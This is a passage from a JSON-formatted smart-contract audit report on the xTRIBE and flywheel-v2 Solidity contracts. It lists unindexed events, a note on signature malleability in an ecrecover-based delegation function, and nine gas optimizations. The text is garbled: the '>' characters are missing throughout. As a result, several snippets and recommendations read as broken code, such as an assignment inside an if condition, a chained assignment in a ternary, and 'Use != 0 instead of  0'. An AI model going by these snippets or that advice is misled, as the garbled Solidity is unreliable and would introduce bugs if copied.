cycleEnd);\n\n\nERC20Gauges.sol#L234(https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L234)<br\n\nsolidity\nFile: lib/flywheel-v2/src/token/ERC20Gauges.sol   #6\n\n237     event DecrementGaugeWeight(address indexed user, address indexed gauge, uint256 weight, uint32 cycleEnd);\n\n\nERC20Gauges.sol#L237(https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L237)<br\n\nsolidity\nFile: lib/flywheel-v2/src/token/ERC20Gauges.sol   #7\n\n440     event MaxGaugesUpdate(uint256 oldMaxGauges, uint256 newMaxGauges);\n\n\nERC20Gauges.sol#L440(https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L440)<br\n\nsolidity\nFile: lib/flywheel-v2/src/token/ERC20Gauges.sol   #8\n\n443     event CanContractExceedMaxGaugesUpdate(address indexed account, bool canContractExceedMaxGauges);\n\n\nERC20Gauges.sol#L443(https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L443)<br\n\nsolidity\nFile: lib/flywheel-v2/src/token/ERC20MultiVotes.sol   #9\n\n102     event MaxDelegatesUpdate(uint256 oldMaxDelegates, uint256 newMaxDelegates);\n\n\nERC20MultiVotes.sol#L102(https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20MultiVotes.sol#L102)<br\n\nsolidity\nFile: lib/flywheel-v2/src/token/ERC20MultiVotes.sol   #10\n\n105     event CanContractExceedMaxDelegatesUpdate(address indexed account, bool canContractExceedMaxDelegates);\n\n\nERC20MultiVotes.sol#L105(https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20MultiVotes.sol#L105)<br\n\nsolidity\nFile: lib/flywheel-v2/src/token/ERC20MultiVotes.sol   #11\n\n135     event Delegation(address indexed delegator, address indexed delegate, uint256 amount);\n\n\nERC20MultiVotes.sol#L135(https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20MultiVotes.sol#L135)<br\n\nsolidity\nFile: lib/flywheel-v2/src/token/ERC20MultiVotes.sol   #12\n\n138     event Undelegation(address indexed delegator, address indexed delegate, uint256 amount);\n\n\nERC20MultiVotes.sol#L138(https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20MultiVotes.sol#L138)<br\n\nsolidity\nFile: lib/flywheel-v2/src/token/ERC20MultiVotes.sol   #13\n\n141     event DelegateVotesChanged(address indexed delegate, uint256 previousBalance, uint256 newBalance);\n\n\nERC20MultiVotes.sol#L141(https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20MultiVotes.sol#L141)<br\n\n\n",
                "Repair": ""
            },
            {
                "Name": "-09",
                "Location": [
                    "//solidity\nFile: lib/flywheel-v2/src/token/ERC20MultiVotes.sol   #1\n\n380        address signer = ecrecover(\n381            keccak256(\n382                abi.encodePacked(\n383                    \"x19x01\",\n384                    DOMAIN_SEPARATOR(),\n385                    keccak256(abi.encode(DELEGATION_TYPEHASH, delegatee, nonce, expiry))\n386                )\n387            ),\n388            v,\n389            r,\n390            s\n391        );\n392        require(nonce == nonces[signer]++, \"ERC20MultiVotes: invalid nonce\");\n393        require(signer != address(0));\n394        _delegate(signer, delegatee);\n"
                ],
                "Type": " Consider addings checks for signature malleability",
                "Description": "\nsolidity\nFile: lib/flywheel-v2/src/token/ERC20MultiVotes.sol   #1\n\n380        address signer = ecrecover(\n381            keccak256(\n382                abi.encodePacked(\n383                    \"x19x01\",\n384                    DOMAIN_SEPARATOR(),\n385                    keccak256(abi.encode(DELEGATION_TYPEHASH, delegatee, nonce, expiry))\n386                )\n387            ),\n388            v,\n389            r,\n390            s\n391        );\n392        require(nonce == nonces[signer]++, \"ERC20MultiVotes: invalid nonce\");\n393        require(signer != address(0));\n394        _delegate(signer, delegatee);\n\n\nERC20MultiVotes.sol#L380-L394(https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20MultiVotes.sol#L380-L394)<br\n\n0xean (judge) commented(https://github.com/code-423n4/2022-04-xtribe-findings/issues/27#issuecomment-1133204534):\n  The severities listed in this QA submission are correct as-is.\n\n\n\n*\n\n# Gas Optimizations\n\nFor this contest, 33 reports were submitted by wardens detailing gas optimizations. The report highlighted below(https://github.com/code-423n4/2022-04-xtribe-findings/issues/41) by 0xkatana received the top score from the judge.\n\n*The following wardens also submitted reports: Dravee(https://github.com/code-423n4/2022-04-xtribe-findings/issues/34), IllIllI(https://github.com/code-423n4/2022-04-xtribe-findings/issues/28), delfin454000(https://github.com/code-423n4/2022-04-xtribe-findings/issues/68), joestakey(https://github.com/code-423n4/2022-04-xtribe-findings/issues/74), catchup(https://github.com/code-423n4/2022-04-xtribe-findings/issues/51), Tomio(https://github.com/code-423n4/2022-04-xtribe-findings/issues/84), defsec(https://github.com/code-423n4/2022-04-xtribe-findings/issues/96), oyc_109(https://github.com/code-423n4/2022-04-xtribe-findings/issues/15), robee(https://github.com/code-423n4/2022-04-xtribe-findings/issues/7), Scocco(https://github.com/code-423n4/2022-04-xtribe-findings/issues/11), 0xNazgul(https://github.com/code-423n4/2022-04-xtribe-findings/issues/9), 0v3rf10w(https://github.com/code-423n4/2022-04-xtribe-findings/issues/14), saian(https://github.com/code-423n4/2022-04-xtribe-findings/issues/52), joshie(https://github.com/code-423n4/2022-04-xtribe-findings/issues/8), CertoraInc(https://github.com/code-423n4/2022-04-xtribe-findings/issues/70), fatima_naz(https://github.com/code-423n4/2022-04-xtribe-findings/issues/32), nahnah(https://github.com/code-423n4/2022-04-xtribe-findings/issues/77), teryanarmen(https://github.com/code-423n4/2022-04-xtribe-findings/issues/95), z3s(https://github.com/code-423n4/2022-04-xtribe-findings/issues/17), Funen(https://github.com/code-423n4/2022-04-xtribe-findings/issues/89), NoamYakov(https://github.com/code-423n4/2022-04-xtribe-findings/issues/60), kebabsec(https://github.com/code-423n4/2022-04-xtribe-findings/issues/85), sorrynotsorry(https://github.com/code-423n4/2022-04-xtribe-findings/issues/38), djxploit(https://github.com/code-423n4/2022-04-xtribe-findings/issues/36), gzeon(https://github.com/code-423n4/2022-04-xtribe-findings/issues/62), 0x1f8b(https://github.com/code-423n4/2022-04-xtribe-findings/issues/47), Fitraldys(https://github.com/code-423n4/2022-04-xtribe-findings/issues/79), rayn(https://github.com/code-423n4/2022-04-xtribe-findings/issues/59), samruna(https://github.com/code-423n4/2022-04-xtribe-findings/issues/29), rotcivegaf(https://github.com/code-423n4/2022-04-xtribe-findings/issues/90), 0xmint(https://github.com/code-423n4/2022-04-xtribe-findings/issues/73), and csanuragjain(https://github.com/code-423n4/2022-04-xtribe-findings/issues/31).*\n\n## [G-01] Redundant zero initialization\n\nSolidity does not recognize null as a value, so uint variables are initialized to zero. Setting a uint variable to zero is redundant and can waste gas.\n\nThere are several places where an int is initialized to zero, which looks like:\n\n    uint256 amount = 0;\n\nInstances in code:<br\nERC20Gauges.sol#L134(https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L134)<br\nERC20Gauges.sol#L184(https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L184)<br\nERC20Gauges.sol#L307(https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L307)<br\nERC20Gauges.sol#L384(https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L384)<br\nERC20Gauges.sol#L564(https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L564)<br\nERC20MultiVotes.sol#L346(https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20MultiVotes.sol#L346)<br\nERC20MultiVotes.sol#L79(https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20MultiVotes.sol#L79)<br\nxTRIBE.sol#L95(https://github.com/fei-protocol/xTRIBE/blob/989e47d176facbb0c38bc1e1ca58672f179159e1/src/xTRIBE.sol#L95)<br\n\n",
                "Repair": "\nRemove the redundant zero initialization<br\nuint256 amount;\n\n## [G-02] Use prefix not postfix in loops\n\nUsing a prefix increment (++i) instead of a postfix increment (i++) saves gas for each loop cycle and so can have a big gas impact when the loop executes on a large number of elements.\n\nThere are several examples of this:<br\nMulticall.sol#L14(https://github.com/fei-protocol/ERC4626/blob/643cd044fac34bcbf64e1c3790a5126fec0dbec1/src/external/Multicall.sol#L14)<br\nFlywheelGaugeRewards.sol#L189(https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/rewards/FlywheelGaugeRewards.sol#L189)<br\nERC20MultiVotes.sol#L346(https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20MultiVotes.sol#L346)<br\nERC20Gauges.sol#L137(https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L137)<br\nERC20Gauges.sol#L187(https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L187)<br\nERC20Gauges.sol#L314(https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L314)<br\nERC20Gauges.sol#L391(https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L391)<br\nERC20Gauges.sol#L576(https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L576)<br\nxTRIBE.sol#L99(https://github.com/fei-protocol/xTRIBE/blob/989e47d176facbb0c38bc1e1ca58672f179159e1/src/xTRIBE.sol#L99)<br\n\n### Recommended Mitigation Steps\n\nUse prefix not postfix to increment in a loop.\n\n## [G-03] Short require strings save gas\n\nStrings in solidity are handled in 32 byte chunks. A require string longer than 32 bytes uses more gas. Shortening these strings will save gas.\n\nOne cases of this gas optimization was found<br\n34 chars<br\nERC20MultiVotes.sol#L379(https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20MultiVotes.sol#L379)<br\n\n### Recommended Mitigation Steps\n\nShorten all require strings to less than 32 characters.\n\n## [G-04] Use != 0 instead of  0\n\nUsing  0 uses slightly more gas than using != 0. Use != 0 when comparing uint variables to zero, which cannot hold values below zero\n\nLocations where this was found include:<br\nPeripheryPayments.sol#L38(https://github.com/fei-protocol/ERC4626/blob/643cd044fac34bcbf64e1c3790a5126fec0dbec1/src/external/PeripheryPayments.sol#L38)<br\nPeripheryPayments.sol#L45(https://github.com/fei-protocol/ERC4626/blob/643cd044fac34bcbf64e1c3790a5126fec0dbec1/src/external/PeripheryPayments.sol#L45)<br\nPeripheryPayments.sol#L60(https://github.com/fei-protocol/ERC4626/blob/643cd044fac34bcbf64e1c3790a5126fec0dbec1/src/external/PeripheryPayments.sol#L60)<br\nPeripheryPayments.sol#L66(https://github.com/fei-protocol/ERC4626/blob/643cd044fac34bcbf64e1c3790a5126fec0dbec1/src/external/PeripheryPayments.sol#L66)<br\nFlywheelCore.sol#L167(https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/FlywheelCore.sol#L167)<br\nFlywheelCore.sol#L218(https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/FlywheelCore.sol#L218)<br\nERC20Gauges.sol#L467(https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L467)<br\nERC20Gauges.sol#L487(https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L487)<br\nERC20MultiVotes.sol#L287(https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20MultiVotes.sol#L287)<br\n\n### Recommended Mitigation Steps\n\nReplace  0 with != 0 to save gas.\n\n## [G-05] Cache array length before loop\n\nCaching the array length outside a loop saves reading it on each iteration, as long as the array's length is not changed during the loop. This saves gas.\n\nThis optimization is already used in some places, but is not used in this place:<br\nMulticall.sol#L14(https://github.com/fei-protocol/ERC4626/blob/643cd044fac34bcbf64e1c3790a5126fec0dbec1/src/external/Multicall.sol#L14)<br\n\n### Recommended Mitigation Steps\n\nCache the array length before the for loop.\n\n## [G-06] Bitshift for divide by 2\n\nWhen multiply or dividing by a power of two, it is cheaper to bitshift than to use standard math operations.\n\nThere is a divide by 2 operation on this line:<br\nERC20MultiVotes.sol#L94(https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20MultiVotes.sol#L94)<br\n\n### Recommended Mitigation Steps\n\nBitshift right by one bit instead of dividing by 2 to save gas.\n\n## [G-07] Use simple comparison in trinary logic\n\nThe comparison operators = and <= use more gas than , <, or ==. Replacing the  = and \u2264 operators with a comparison operator that has an opcode in the EVM saves gas.\n\nThe existing code is:<br\nFlywheelDynamicRewards.sol#L50(https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/rewards/FlywheelDynamicRewards.sol#L50)<br\n\n    uint32 latest = timestamp = cycle.end ? cycle.end : timestamp;\n\nA simple comparison can be used for gas savings by reversing the logic:\n\n    uint32 latest = timestamp < cycle.end ? timestamp : cycle.end;\n\n### Recommended Mitigation Steps\n\nReplace the comparison operator and reverse the logic to save gas using the suggestions above.\n\n## [G-08] Use simple comparison in if statement\n\nThe comparison operators = and <= use more gas than , <, or ==. Replacing the  = and \u2264 operators with a comparison operator that has an opcode in the EVM saves gas.\n\nThe existing code is:<br\nERC20Gauges.sol#L37-L39(https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L37-L39)<br\n\n    if (_incrementFreezeWindow = _gaugeCycleLength) revert IncrementFreezeError();\n    gaugeCycleLength = _gaugeCycleLength;\n    incrementFreezeWindow = _incrementFreezeWindow;\n\nA simple comparison can be used for gas savings by reversing the logic:<br\n\n    if (_incrementFreezeWindow < _gaugeCycleLength) {\n    gaugeCycleLength = _gaugeCycleLength;\n    incrementFreezeWindow = _incrementFreezeWindow;\n    } else {\n    revert IncrementFreezeError();\n    }\n\n### Recommended Mitigation Steps\n\nReplace the comparison operator and reverse the logic to save gas using the suggestions above.\n\n## [G-09] Use calldata instead of memory for function parameters\n\nUse calldata instead of memory for function parameters. Having function arguments use calldata instead of memory can save gas.\n\nThere are several cases of function arguments using memory instead of calldata:<br\nENSReverseRecord.sol#L22(https://github.com/fei-protocol/ERC4626/blob/643cd044fac34bcbf64e1c3790a5126fec0dbec1/src/utils/ENSReverseRecord.sol#L22)<br\nENSReverseRecord.sol#L26(https://github.com/fei-protocol/ERC4626/blob/643cd044fac34bcbf64e1c3790a5126fec0dbec1/src/utils/ENSReverseRecord.sol#L26)<br\nFlywheelCore.sol#L210(https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/FlywheelCore.sol#L210)<br\n\n### Recommended Mitigation Steps\n\nChange function arguments from memory to calldata.\n\n\n\n*\n\n\n"
            }
        ]
    }
]